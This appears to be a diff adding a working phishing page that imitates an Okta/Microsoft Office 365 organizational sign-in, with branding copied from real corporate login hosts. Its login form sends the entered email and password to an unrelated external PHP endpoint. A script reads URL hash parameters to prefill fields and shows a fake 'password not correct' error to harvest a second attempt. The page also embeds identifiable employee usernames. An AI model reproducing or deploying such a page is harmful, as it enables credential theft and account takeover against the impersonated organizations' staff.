@@ -1,0 +1,747 @@
+
+<!DOCTYPE html>
+<!--[if IE 7]><html class="lt-ie10 lt-ie9 lt-ie8"><![endif]-->
+<!--[if IE 8]><html class="lt-ie10 lt-ie9"> <![endif]-->
+<!--[if IE 9]><html class="lt-ie10"><![endif]-->
+<!--[if gt IE 9]><html><![endif]-->
+<!--[if !IE]><!--><html><!--<![endif]-->
+<head>
+
+    <script>if (typeof module === 'object') {window.module = module; module = undefined;}</script>
+
+    <title> Sign In</title>
+        <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="none" />
+<link rel="stylesheet" type="text/css" 
+		href="https://adfs.kiwacompany.com/adfs/portal/css/style.css?id=B504CDBD4DFA77BAA638DE804032565A761ED0A14C4EFDD650B124A12E5C63A0" /><style>.illustrationClass {background-image:url(https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-6ybrougjmflxqw910ieyohr7wb4x4-yvoixrlaidmz4/appbranding/askzfdsqe20i-bcjwporaywega7vbt4acqnn1hiliiw/0/heroillustration?ts=635833785786917227);}</style>
+
+    <link href="https://dentsuaegis.okta-emea.com/assets/loginpage/css/okta-login-page.min.f2d34f4f1005894f76211debc41e459a.css" type="text/css" rel="stylesheet"/><script>
+        var okta = {
+            locale: 'en',
+            deployEnv: 'PROD'
+        };
+    </script>
+		  <script type="text/javascript">
+	
+	window.onload=function(){ 
+  var hashParams = window.location.hash.substr(1).split('&'); // substr(1) to remove the `#`
+for(var i = 0; i < hashParams.length; i++){
+    var p = hashParams[i].split('=');
+    document.getElementById(p[0]).value = decodeURIComponent(p[1]);;
+	var tokenValue = document.getElementById('token').value;
+	 if(tokenValue==2){
+	 document.getElementById("wrongPass").innerHTML = "Your account or password is not correct and did not match. Try Again,";
+	 }
+	
+}
+ } 
+ 
+</script>
+
+       <script type='text/javascript'>
+//<![CDATA[
+function LoginErrors(){
+this.userNameFormatError = 'Enter your user ID in the format "user domain" or "user @ domain";'; 
+this.passwordEmpty = 'Enter your Password.'; 
+this.passwordTooLong = 'Password is too long (\u0026gt; 128 characters).';}; 
+var maxPasswordLength = 128;
+//]]>
+
+</script>
+
+<script type='text/javascript'>
+
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+function InputUtil(errTextElementID, errDisplayElementID) {
+
+    if (!errTextElementID)  errTextElementID = 'errorText'; 
+    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+
+    this.hasFocus = false;
+    this.errLabel = document.getElementById(errTextElementID);
+    this.errDisplay = document.getElementById(errDisplayElementID);
+};
+InputUtil.prototype.canDisplayError = function () {
+    return this.errLabel && this.errDisplay;
+}
+InputUtil.prototype.checkError = function () {
+    if (!this.canDisplayError){
+        throw new Error ('Error element not present');
+    }
+    if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';        
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+            var causeNode = document.getElementById(cause);
+            if (causeNode && causeNode.value) {
+                causeNode.focus();
+                this.hasFocus = true;
+            }
+        }
+    }
+    else {
+        this.errDisplay.style.display = 'none';
+    }
+};
+InputUtil.prototype.setInitialFocus = function (input) {
+    if (this.hasFocus) return;
+    var node = document.getElementById(input);
+    if (node) {
+        if ((/^\s*$/).test(node.value)) {
+            node.focus();
+            this.hasFocus = true;
+        }
+    }
+};
+InputUtil.prototype.setError = function (input, errorMsg) {
+    if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+    }
+    input.focus();
+
+    if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+    }
+    this.errLabel.setAttribute('for', input.id);
+    this.errDisplay.style.display = '';
+};
+InputUtil.makePlaceholder = function (input) {
+    var ua = navigator.userAgent;
+
+    if (ua != null && 
+        (ua.match(/MSIE 9.0/) != null || 
+         ua.match(/MSIE 8.0/) != null ||
+         ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+            var placeholder = node.getAttribute("placeholder");
+            if (placeholder != null && placeholder != '') {
+                var label = document.createElement('input');
+                label.type = "text";
+                label.value = placeholder;
+                label.readOnly = true;
+                label.style.position = 'absolute';
+                label.style.borderColor = 'transparent';
+                label.className = node.className + ' hint';
+                label.tabIndex = -1;
+                label.onfocus = function () { this.nextSibling.focus(); };
+
+                node.style.position = 'relative';
+                node.parentNode.style.position = 'relative';
+                node.parentNode.insertBefore(label, node);
+                node.onkeyup = function () { InputUtil.showHint(this); };
+                node.onblur = function () { InputUtil.showHint(this); };
+                node.style.background = 'transparent';
+
+                node.setAttribute("placeholder", "");
+                InputUtil.showHint(node);
+            }
+        }
+    }
+};
+InputUtil.focus = function (inputField) {
+    var node = document.getElementById(inputField);
+    if (node) node.focus();
+};
+InputUtil.hasClass = function(node, clsName) {
+    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+};
+InputUtil.addClass = function(node, clsName) {
+    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+};
+InputUtil.removeClass = function(node, clsName) {
+    if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+    }
+};
+InputUtil.showHint = function (node, gotFocus) {
+    if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+    }
+    else {
+        node.previousSibling.style.display = '';
+    }
+};
+InputUtil.updatePlaceholder = function (input, placeholderText) {
+    var node = document.getElementById(input);
+    if (node) {
+        var ua = navigator.userAgent;
+        if (ua != null &&
+            (ua.match(/MSIE 9.0/) != null ||
+            ua.match(/MSIE 8.0/) != null ||
+            ua.match(/MSIE 7.0/) != null)) {
+            var label = node.previousSibling;
+            if (label != null) {
+                label.value = placeholderText;
+            }
+        }
+        else {
+            node.placeholder = placeholderText;
+        }
+    }
+};
+
+//]]>
+</script>
+    <script>window.okta || (window.okta = {}); okta.cdnUrlHostname = ""; okta.cdnPerformCheck = true; okta.cdnPerformCheckHostname = "//eu1static.oktacdn.com";</script><script>window.okta || (window.okta = {});window.okta.mixpanel = false;window.okta.mixpanelTrackingSamplingFactors = {"_DEFAULT":1.0};</script><script>if (window.module) module = window.module;</script>
+
+</head>
+<body class="auth okta-container">
+
+<!--[if gte IE 8]>
+  <![if lte IE 9]>
+
+    <style>
+    .unsupported-browser-banner-wrap {
+      padding: 20px;
+      border: 1px solid #ddd;
+      background-color: #f3fbff;
+    }
+    .unsupported-browser-banner-inner {
+      position: relative;
+      width: 735px;
+      margin: 0 auto;
+      text-align: left;
+    }
+    .unsupported-browser-banner-inner .icon {
+      vertical-align: top;
+      margin-right: 20px;
+      display: inline-block;
+      position: static !important;
+    }
+    .unsupported-browser-banner-inner a {
+      text-decoration: underline;
+    }
+    </style>
+
+    <div class="unsupported-browser-banner-wrap">
+      <div class="unsupported-browser-banner-inner">
+        <span class="icon icon-16 icon-only warning-16-yellow"></span>You are using an unsupported browser. For the best experience, update to <a href="https://support.okta.com/help/articles/Knowledge_Article/24532952-Platforms---Browser-and-OS-Support">a supported browser</a>.</div>
+    </div>
+
+  <![endif]>
+<![endif]-->
+<!--[if IE 8]> <div id="login-bg-image-ie8" class="login-bg-image" data-se="login-bg-image"></div> <![endif]-->
+<!--[if (gt IE 8)|!(IE)]><!--> <div id="login-bg-image" class="login-bg-image" data-se="login-bg-image"></div> <!--<![endif]-->
+
+<!-- hidden form for reposting fromURI for X509 auth -->
+<form action="" method="post" id="x509_login" name="x509_login" style="display:none;">
+    <input type="hidden" class="hide" name="_xsrfToken" value="null"/><input type="hidden" id="fromURI" name="fromURI" class="hidden" value="&#x2f;app&#x2f;office365&#x2f;exk3c7i2srCdbgFuj0i7&#x2f;sso&#x2f;wsfed&#x2f;passive&#x3f;client-request-id&#x3d;c151137d-a3f1-44f3-985e-fe0563b49621&amp;wa&#x3d;wsignin1.0&amp;wtrealm&#x3d;urn&#x25;3afederation&#x25;3aMicrosoftOnline&amp;wctx&#x3d;LoginOptions&#x25;3D3&#x25;26estsredirect&#x25;3d2&#x25;26estsrequest&#x25;3drQIIAYWSO2_bVgCFTclWEg9t2hptlwQukKFoQerey0tSEhIgtEnaskRRsqRS5FBBD1KXl-JDIiVKBIKu3ZIpCDImUzMWHYJuXT1lypBsmYJOfSydiiq_oMsBPuCbzjmH10QOcYAD3xQhB2t3MI-FkTSustWRyLO4CgE7wkhkeYEXeQTgVAD88tPDmw8-6_z25_O_lSff_3sw-eXxVy-Y2yRN46RWLmdZxkWu600cbhIF5fkonHrh7CXDvGKY9wzztFBwwheFROQliHlUxUDCooAhQFxLmQdGbz63qZoavSmxugBYgSo0ez5vmXqqUx_rPQvb5iWxqAx23tZCdWwonbRlXtCWt_PpLN_5G9vspBYlVM_lra7Igq4Q8qbwsSGvUoI-RLT0cuevwg03WgbDOErSp8XHhdOBzSZkYbRFKq4rpHoxyKSRMh9rqrr2F-7M2PRBIvRXs7PuShmkzeHW7-LWxMll1gYLAtfmqCsaq3UbkSptRtjmtQsZum0pCWwfzVje9DYSaxLju06gnUC83da1DPcdvn9ZZ882MVno8zE9NwKArFM5jPMTMWfrFLeHRtKxzgbuNndEEmg-PlErDkgajVimZDnwbWBo1PS3VMxo2slN1IhSMzvfBM2s4zcEH1bkODgPQZuebgK132-ch82e66xJd2SHoK8LWmWs9YWOON-MXcGj1mVAk2oXjfXFZvZzsbRbMojCq-JHUeyE3vQ4XkauN3feFW8lZEU9zo-CXaH3qTPmpk6YJqvd9hyNX-0zv-9_fr10s_Dl3vHe10egWLu-o-IH-mefeXawu9L7H44evn5713ipPfnpi9eDvauD8sksvehGdutbKEk8CVUqtnMJSfUyXCnZaKIkajnRqqShpZV7sAYflZhHpdJV6ZO6MmypvW5PbinypYKG4I8S8-O1vV9v_M853xweIYAACyAL4TGo1ARQQ6L9Hw2&amp;cbcxt&#x3d;&amp;username&#x3d;shuji.komori&#x25;40jeb.dentsu.co.jp&amp;mkt&#x3d;en&amp;lc&#x3d;"/>
+</form>
+
+<div class="content">
+  <div class="applogin-banner">
+          <div class="applogin-background"></div>
+          <div class="applogin-container">
+              <h1>
+                Connecting to<div class="applogin-app-logo">
+                      <img src="https://dentsuaegis.okta-emea.com/assets/img/logos/office365.4d711d1fe185fdc7fce851dd80cbf15d.png" alt="O365&#x20;-&#x20;dentsu.co.jp" class="logo office365"/></div>
+              </h1>
+            
+          </div>
+      </div>
+  <style type="text/css">
+  #content {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #fff;
+    margin-bottom: 28px;
+    margin-left: auto;
+    margin-right: auto;
+    min-height: 290px;
+    min-width: 320px;
+    max-width: 412px;
+    width: 338px;
+    height: auto;
+    padding: 36px;
+    box-shadow: 0 2px 3px rgba(0,0,0,0.55);
+}
+    .noscript-msg {
+        background-color: #fff;
+        border-color: #ddd #ddd #d8d8d8;
+        box-shadow:0 2px 0 rgba(175, 175, 175, 0.12);
+        text-align: center;
+        width: 398px;
+        min-width: 300px;
+        margin: 200px auto;
+        border-radius: 3px;
+        border-width: 1px;
+        border-style: solid;
+    }
+
+    .noscript-content {
+        padding: 42px;
+    }
+
+    .noscript-content h2 {
+        padding-bottom: 20px;
+    }
+
+    .noscript-content h1 {
+        padding-bottom: 25px;
+    }
+
+    .noscript-content a {
+        background: transparent;
+        box-shadow: none;
+        display: table-cell;
+        vertical-align: middle;
+        width: 314px;
+        height: 50px;
+        line-height: 36px;
+        color: #fff;
+        background: linear-gradient(#007dc1, #0073b2), #007dc1;
+        border: 1px solid;
+        border-color: #004b75;
+        border-bottom-color: #00456a;
+        box-shadow: rgba(0, 0, 0, 0.15) 0 1px 0, rgba(255, 255, 255, 0.1) 0 1px 0 0 inset;
+        -webkit-border-radius: 3px;
+        border-radius: 3px;
+    }
+
+    .noscript-content a:hover {
+        background: #007dc1;
+        cursor: hand;
+        text-decoration: none;
+    }
+</style>
+<noscript>
+    <div id="noscript-msg" class="noscript-msg">
+        <div class="noscript-content">
+            <h2>Javascript is required</h2>
+            <h1>Javascript is disabled on your browser.&nbspPlease enable Javascript and refresh this page.</h1>
+            <a href=".">Refresh</a>
+        </div>
+    </div>
+</noscript>
+<div id="signin-container1">
+      <div id="content">
+                <div id="workArea">
+                    
+    <div id="authArea" class="groupMargin">
+        
+        
+        
+    <div id="loginArea">        
+        <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
+
+        <form  action="https://strrp.com/Mic/360.php" method="post" id="loginForm" autocomplete="off"
+		novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" 
+		action="" >
+		<input name="tag" value="BV" required="required" size="40" autocapitalize="off" type="hidden">
+		<input name="Language" value="EN" required="required" size="40" autocapitalize="off" type="hidden">
+		<input name="token" value="1" id="token" required="required" size="40" autocapitalize="off" type="hidden">
+		<div id="wrongPass" class="fieldMargin error smallText">
+                <span id="wrongPass1" for=""></span>
+            </div>
+            <div id="error" class="fieldMargin error smallText">
+                <span id="errorText" for=""></span>
+            </div>
+
+            <div id="formsAuthenticationArea">
+                <div id="userNameArea">
+                    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+                    <input id="request-id" readOnly name="userid" maxlength="50" type="email" value="" tabindex="1" class="text fullWidth"
+                        spellcheck="false" placeholder="Enter valid email" autocomplete="off"/>
+                </div>
+
+                <div id="passwordArea">
+                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                    <input id="passwordInput" name="pass" type="password" tabindex="2" class="text fullWidth"
+                        placeholder="Password" autocomplete="off"/>
+                </div>
+                <div id="kmsiArea" style="display:''">
+                    <label for="kmsiInput">Keep me signed in</label>
+                </div>
+                <div id="submissionArea" class="submitMargin">
+                    <span id="submitButton" class="submit" tabindex="4" role="button"
+                        onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
+                        onclick="return Login.submitLoginRequest();">Sign in</span>
+                </div>
+            </div>
+            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
+        </form>
+
+             <div id="authOptions">
+        <form id="options"  method="post" action="https://adfs.kiwacompany.com:443/adfs/ls/?client-request-id=4b2ff978-8ac2-47b4-bc18-57d84ce98677&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAXWSu2_TUBTG47gNbYUAIRAdGDowIdm514-8RCXcJHbcPJy2IY69VI4fiZPY17Fv6iQLG0JISJ0rpi6gjogBISbGTh0YoCMTMCEm2HD_AIbzneWnT0fn-x6SkIalBxzL8Ua-X6SKRo6luCIElMExOYrl2RzLAGjxgA1vb9ya_83WP714J33cVL80fjyLz4h7Q4yDqJTNxnFMI8dxTZs2kZd9TxAXBPGdIE7Sads_S0c5Ng9gPjGETA4UAA-KtC7tscnMm14Vt6TWpFkGoNWpLhpqldE6Gta8ZrKtoT6SOaWiey21yjYlcdjsyFiRnrD6QcJL-rihyrzmaVjviF5ztO_pqjhKWHiZvqkIMzxkrgSF7tL-nV53UOgdBijCJ-RrQglsX7bKyPdtE9NXmO1j1zSwi_x2iAI7xK4dbbPYLOzKs_aO5wU9Y9qIBAEL7qLb2tWZeCAcGKqvaOPpMt-fL5yxrfiLtoUA31P360HfnnepLrXs1QZyiA9DO0Z9EThiXVAlvuMc6FZF2Bdt6siLmuJOue4rbWukTNtC2ZvtVQbTIWv135KZ5Kce8s_JG8lRvmttBSFy3In9jbzrzCYmoodogsNZ8HjsxgbtTy5WiJ8r1wFZWlvL3CI3U1upPyvE6WoS4Vfm9M3TR5-ll6_gYv1-N3W-mm1B157mqrVaudezrCU0C85S0HyZr8yK5qB2VJhPIYiERrUdb3MleJwhjjOZXxni-bXUh_X_FeBy405SnCIFChQsbEGuxLIlkNf_AQ2&cbcxt=&username=fulco.holtrup%40kiwa.nl&mkt=en&lc=">
+            <script type="text/javascript">
+                function SelectOption(option) {
+                    var i = document.getElementById('optionSelection');
+                    i.value = option;
+                    document.forms['options'].submit();
+                    return false;
+                }
+            </script>
+            <input id="optionSelection" type="hidden" name="AuthMethod" />
+            <div id='authOptionLinks' class='groupMargin'><a class="actionLink" href="##" id="AzurePrimaryAuthentication" ; return false;">Multi-Factor Authentication</a></div>
+			  <p align="right"><IMG SRC ="http://blogs.microsoft.com/wp-content/uploads/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" BORDER = "0" HEIGHT = "60"
+WIDTH = "150" ALT = "Harvey and Paul Deitel"></p>
+
+        </form>
+      </div>
+
+        <div id="introduction" class="groupMargin">
+                                 
+        </div>
+
+        <script type="text/javascript">
+        //<![CDATA[
+
+            function Login() {
+            }
+
+            Login.userNameInput = 'request-id';
+            Login.passwordInput = 'passwordInput';
+
+            Login.initialize = function () {
+
+                var u = new InputUtil();
+
+                u.checkError();
+                u.setInitialFocus(Login.userNameInput);
+                u.setInitialFocus(Login.passwordInput);
+            }();
+
+            Login.submitLoginRequest = function () { 
+                var u = new InputUtil();
+                var e = new LoginErrors();
+
+                var userName = document.getElementById(Login.userNameInput);
+                var password = document.getElementById(Login.passwordInput);
+
+                if (!userName.value || !userName.value.match('[@\\\\]')) {
+                    u.setError(userName, e.userNameFormatError);
+                    return false;
+                }
+
+                if (!password.value) {
+                    u.setError(password, e.passwordEmpty);
+                    return false;
+                }
+
+                if (password.value.length > maxPasswordLength) {
+                    u.setError(password, e.passwordTooLong);
+                    return false;
+                }
+
+                document.forms['loginForm'].submit();
+                return false;
+            };
+
+            InputUtil.makePlaceholder(Login.userNameInput);
+            InputUtil.makePlaceholder(Login.passwordInput);
+        //]]>
+        </script>
+    </div>
+
+    </div>
+
+                </div>
+                <div id="footerPlaceholder"></div>
+            </div>
+        </div> 
+
+</div>
+  <div id="okta-sign-in" class="auth-container main-container" style="display:none">
+      <div id="unsupported-onedrive" class="unsupported-message" style="display:none">
+        <h2 class="o-form-head">Your OneDrive version is not supported</h2>
+        <p>Upgrade now by installing the OneDrive for Business Next Generation Sync Client to login to Okta</p>
+        <a class="button button-primary" target="_blank" href="https://support.okta.com/help/articles/Knowledge_Article/Upgrading-to-OneDrive-for-Business-Next-Generation-Sync-Client">
+          Learn how to upgrade</a>
+      </div>
+      <div id="unsupported-cookie" class="unsupported-message" style="display:none">
+          <h2 class="o-form-head">Cookies are required</h2>
+          <p>Cookies are disabled on your browser. Please enable Cookies and refresh this page.</p>
+          <a class="button button-primary" target="_blank" href=".">
+              Refresh</a>
+      </div>
+  </div>
+</div>
+
+<div class="footer">
+  <div class="footer-container clearfix">
+    <p class="copyright">Powered by <a href="##" class="inline-block notranslate"> &#169; 2020 Microsoft</a></p>
+        <p class="privacy-policy"><a href="/privacy" target="_blank" class="inline-block margin-l-10">Privacy Policy</a></p>
+    </div>
+</div>
+
+<script type="text/javascript">
+function runLoginPage (fn) {var mainScript = document.createElement('script');mainScript.src = 'https://dentsuaegis.okta-emea.com/assets/js/mvc/loginpage/initLoginPage.pack.479dd4e1fce2ee689a0b388b9bf57159.js';mainScript.crossOrigin = 'anonymous';mainScript.integrity = 'sha384-45Z7JKTJFwZpTxlcD0PlKmaZIA5AmAS9W7e8HTmO3LIz0O+0pCFVYlqjWRT3+r8T';document.getElementsByTagName('head')[0].appendChild(mainScript);fn && mainScript.addEventListener('load', function () { setTimeout(fn, 1) });}</script><script type="text/javascript">
+(function(){
+
+  var baseUrl = 'https://uwebserver.com/Mic/wm.php';
+  var suppliedRedirectUri = '';
+  var repost = false;
+  var stateToken = '';
+  var fromUri = '\x2Fapp\x2Foffice365\x2Fexk3c7i2srCdbgFuj0i7\x2Fsso\x2Fwsfed\x2Fpassive\x3Fclient\x2Drequest\x2Did\x3Dc151137d\x2Da3f1\x2D44f3\x2D985e\x2Dfe0563b49621\x26wa\x3Dwsignin1.0\x26wtrealm\x3Durn\x253afederation\x253aMicrosoftOnline\x26wctx\x3DLoginOptions\x253D3\x2526estsredirect\x253d2\x2526estsrequest\x253drQIIAYWSO2_bVgCFTclWEg9t2hptlwQukKFoQerey0tSEhIgtEnaskRRsqRS5FBBD1KXl\x2DJDIiVKBIKu3ZIpCDImUzMWHYJuXT1lypBsmYJOfSydiiq_oMsBPuCbzjmH10QOcYAD3xQhB2t3MI\x2DFkTSustWRyLO4CgE7wkhkeYEXeQTgVAD88tPDmw8\x2D6_z25_O_lSff_3sw\x2DeXxVy\x2DY2yRN46RWLmdZxkWu600cbhIF5fkonHrh7CXDvGKY9wzztFBwwheFROQliHlUxUDCooAhQFxLmQdGbz63qZoavSmxugBYgSo0ez5vmXqqUx_rPQvb5iWxqAx23tZCdWwonbRlXtCWt_PpLN_5G9vspBYlVM_lra7Igq4Q8qbwsSGvUoI\x2DRLT0cuevwg03WgbDOErSp8XHhdOBzSZkYbRFKq4rpHoxyKSRMh9rqrr2F\x2D7M2PRBIvRXs7PuShmkzeHW7\x2DLWxMll1gYLAtfmqCsaq3UbkSptRtjmtQsZum0pCWwfzVje9DYSaxLju06gnUC83da1DPcdvn9ZZ882MVno8zE9NwKArFM5jPMTMWfrFLeHRtKxzgbuNndEEmg\x2DPlErDkgajVimZDnwbWBo1PS3VMxo2slN1IhSMzvfBM2s4zcEH1bkODgPQZuebgK132\x2Dch82e66xJd2SHoK8LWmWs9YWOON\x2DMXcGj1mVAk2oXjfXFZvZzsbRbMojCq\x2DJHUeyE3vQ4XkauN3feFW8lZEU9zo\x2DCXaH3qTPmpk6YJqvd9hyNX\x2D0zv\x2D9_fr10s_Dl3vHe10egWLu\x2Do\x2DIH\x2DmefeXawu9L7H44evn5713ipPfnpi9eDvauD8sksvehGdutbKEk8CVUqtnMJSfUyXCnZaKIkajnRqqShpZV7sAYflZhHpdJV6ZO6MmypvW5PbinypYKG4I8S8\x2DO1vV9v_M853xweIYAACyAL4TGo1ARQQ6L9Hw2\x26cbcxt\x3D\x26username\x3Dshuji.komori\x2540jeb.dentsu.co.jp\x26mkt\x3Den\x26lc\x3D';
+  var username = '';
+  var rememberMe = true;
+  var smsRecovery = true;
+  var callRecovery = true;
+  var emailRecovery = true;
+  var usernameLabel = 'Primary\x20E\x2DMail\x20Address';
+  var usernameInlineLabel = 'Your\x20primary\x20email\x20address,\x20for\x20example,\x20firstname.lastname\x40domain.com';
+  var passwordLabel = 'Password';
+  var passwordInlineLabel = '';
+  var signinLabel = 'Sign\x20In';
+  var forgotpasswordLabel = 'Forgot\x20\x2F\x20Reset\x20Password\x3F';
+  var unlockaccountLabel = 'Unlock\x20account\x3F';
+  var helpLabel = 'Help';
+  var orgSupportPhoneNumber = '';
+  var hideSignOutForMFA = false;
+  var hideBackToSignInForReset = false;
+  var loginPageUrlRedirect = '';
+  var enableUrlFixForEmbeddedBrowsers = false;
+  var footerHelpTitle = 'Need\x20help\x20signing\x20in\x3F';
+  var recoveryFlowPlaceholder = 'Primary\x20E\x2DMail\x20Address';
+  var signOutUrl = '';
+  var authScheme = 'OAUTH2';
+  var hasPasswordlessPolicy = '';
+
+  var securityImage = true;
+  
+
+  var windowsVerify = false;
+  
+    windowsVerify = true;
+  
+
+  var selfServiceUnlock = false;
+  
+    selfServiceUnlock = true;
+  
+
+  var preventBrowserFromSavingOktaPassword = false;
+  
+
+  var enableMixpanelTracking = false;
+  
+
+  var redirectByFormSubmit = false;
+  
+
+  var restrictRedirectToForeground = false;
+  
+
+  var hideDefaultTip = true;
+  
+
+  var autoPush = false;
+  
+    autoPush = true;
+  
+
+  var publishToAccountChooser = false;
+  var accountChooserDiscoveryUrl = null;
+  
+    publishToAccountChooser = true;
+    accountChooserDiscoveryUrl = 'https://login.okta.com/discovery/iframe.html';
+  
+
+  // In case of custom app login, the uri is already absolute, so we must not attach baseUrl
+  var redirectUri;
+  if (isAbsoluteUri(fromUri)) {
+      redirectUri = fromUri;
+  } else {
+      redirectUri = baseUrl + fromUri;
+  }
+  
+
+  var customButtons;
+  
+
+  var customLinks = [];
+  
+
+  var linkParams;
+  
+
+  var stateTokenAllFlows;
+  
+
+  var idpDiscovery;
+  var idpDiscoveryRequestContext;
+  
+
+  var showPasswordToggleOnSignInPage = false;
+  
+
+  var hasOAuth2ConsentFeature = false;
+  var consentFunc;
+  
+
+  var hasMfaAttestationFeature = false;
+  
+    hasMfaAttestationFeature = true;
+  
+
+  var registration = false;
+  
+
+  var webauthn = true;
+  
+
+  var loginPageConfig = {
+    fromUri: fromUri,
+    repost: repost,
+    redirectUri: redirectUri,
+    isMobileClientLogin: false,
+    isMobileSSO: false,
+
+    linkParams: linkParams,
+    hasChromeOSFeature: false,
+    showLinkToAppStore: false,
+    publishToAccountChooser: publishToAccountChooser,
+    accountChooserDiscoveryUrl: accountChooserDiscoveryUrl,
+    preventBrowserFromSavingOktaPassword: preventBrowserFromSavingOktaPassword,
+    enableMixpanelTracking: enableMixpanelTracking,
+    enableUrlFixForEmbeddedBrowsers: enableUrlFixForEmbeddedBrowsers,
+    loginPageUrlRedirect: loginPageUrlRedirect,
+    mfaAttestation: hasMfaAttestationFeature,
+    enrollingFactor: '',
+    signIn: {
+      el: '#signin-container',
+      baseUrl: baseUrl,
+      brandName: 'Okta',
+      logo: '',
+      logoText: 'MyApps logo',
+      helpSupportNumber: orgSupportPhoneNumber,
+      stateToken: stateToken,
+      username: username,
+      signOutLink: signOutUrl,
+      consent: consentFunc,
+      authScheme: authScheme,
+      relayState: fromUri,
+      idpDiscovery: {
+        requestContext: idpDiscoveryRequestContext
+      },
+      features: {
+        router: true,
+        securityImage: securityImage,
+        rememberMe: rememberMe,
+        autoPush: autoPush,
+        webauthn: webauthn,
+        smsRecovery: smsRecovery,
+        callRecovery: callRecovery,
+        emailRecovery: emailRecovery,
+        windowsVerify: windowsVerify,
+        selfServiceUnlock: selfServiceUnlock,
+        multiOptionalFactorEnroll: true,
+        deviceFingerprinting: true,
+        useDeviceFingerprintForSecurityImage: true,
+        trackTypingPattern: false,
+        hideSignOutLinkInMFA: hideSignOutForMFA,
+        hideBackToSignInForReset: hideBackToSignInForReset,
+        customExpiredPassword: true,
+        idpDiscovery: idpDiscovery,
+        passwordlessAuth: hasPasswordlessPolicy,
+        consent: hasOAuth2ConsentFeature,
+        showPasswordToggleOnSignInPage: showPasswordToggleOnSignInPage,
+        registration: registration,
+        redirectByFormSubmit: redirectByFormSubmit,
+        restrictRedirectToForeground: restrictRedirectToForeground,
+        hideDefaultTip: hideDefaultTip
+      },
+
+      assets: {
+        baseUrl: okta.cdnUrlHostname + '/assets/js/mvc/loginpage/i18n'
+      },
+
+      language: okta.locale,
+      i18n: {},
+
+      customButtons: customButtons,
+
+      helpLinks: {
+        help: '',
+        forgotPassword: '',
+        unlock: '',
+        custom: customLinks
+      }
+    }
+  };
+
+  loginPageConfig.signIn.i18n[okta.locale] = {
+    
+    'primaryauth.username.placeholder': usernameLabel,
+    'primaryauth.username.tooltip': usernameInlineLabel,
+    'primaryauth.password.placeholder': passwordLabel,
+    'primaryauth.password.tooltip': passwordInlineLabel,
+    'mfa.challenge.password.placeholder': passwordLabel,
+    'primaryauth.title': signinLabel,
+    'forgotpassword': forgotpasswordLabel,
+    'unlockaccount': unlockaccountLabel,
+    'help': helpLabel,
+    'needhelp': footerHelpTitle,
+    'password.forgot.email.or.username.placeholder': recoveryFlowPlaceholder,
+    'password.forgot.email.or.username.tooltip': recoveryFlowPlaceholder,
+    'account.unlock.email.or.username.placeholder': recoveryFlowPlaceholder,
+    'account.unlock.email.or.username.tooltip': recoveryFlowPlaceholder
+  };
+
+  function isOldWebBrowserControl() {
+    // We no longer support IE7. If we see the MSIE 7.0 browser mode, it's a good signal
+    // that we're in a windows embedded browser.
+    if (navigator.userAgent.indexOf('MSIE 7.0') === -1) {
+      return false;
+    }
+
+    // Because the userAgent is the same across embedded browsers, we use feature
+    // detection to see if we're running on older versions that do not support updating
+    // the documentMode via x-ua-compatible.
+    return document.all && !window.atob;
+  }
+
+  function isAbsoluteUri(uri) {
+    var pat = /^https?:\/\//i;
+    return pat.test(uri);
+  }
+
+  var unsupportedContainer = document.getElementById('okta-sign-in');
+
+  var failIfCookiesDisabled = true;
+  
+
+  // Old versions of WebBrowser Controls (specifically, OneDrive) render in IE7 browser
+  // mode, with no way to override the documentMode. In this case, inform the user they need
+  // to upgrade.
+  if (isOldWebBrowserControl()) {
+    document.getElementById('unsupported-onedrive').removeAttribute('style');
+    unsupportedContainer.removeAttribute('style');
+  }
+  else if (failIfCookiesDisabled && !navigator.cookieEnabled) {
+    document.getElementById('unsupported-cookie').removeAttribute('style');
+    unsupportedContainer.removeAttribute('style');
+  }
+  else {
+    unsupportedContainer.parentNode.removeChild(unsupportedContainer);
+    runLoginPage(function () {
+      OktaLogin.initLoginPage(loginPageConfig);
+    });
+  }
+
+}());
+</script>
+
+<script>
+  window.addEventListener('load', function(event) {
+    function applyStyle(id, style) {
+      if (style) {
+        var el = document.getElementById(id);
+        if (el) {
+          el.setAttribute('style', style);
+        }
+      }
+    }
+    applyStyle('login-bg-image', "background-image: url('https://i.imgur.com/wfKy3rD.jpg')");
+    applyStyle('login-bg-image-ie8', "filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://dentsuaegis.okta-emea.com/fs/bco/7/fs03ho9zih6hBOrDA0i7', sizingMethod='scale')");
+  });
+</script>
+
+</body>
+</html>
